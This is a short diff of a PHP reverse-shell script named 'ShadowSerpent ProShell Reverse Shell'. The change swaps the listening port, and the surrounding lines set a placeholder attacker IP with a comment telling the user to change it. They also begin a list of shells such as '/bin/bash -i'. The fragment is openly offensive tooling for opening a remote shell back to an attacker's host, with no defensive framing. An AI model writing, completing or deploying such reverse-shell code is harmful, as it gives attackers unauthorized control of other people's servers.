@@ -3,7 +3,7 @@
 // 🐍– ShadowSerpent ProShell Reverse Shell
 
 $ip = 'YOUR.IP.ADDR.HERE';   // 🔧 CHANGE THIS TO YOUR ATTACKER IP
-$port = 4555;                 // ✅  Add any port like 4455 ,6667
+$port = 4455;                 // ✅  Add any port like 4455 ,6667 , 3355 , 2243
 
 $shells = [
     '/bin/bash -i',
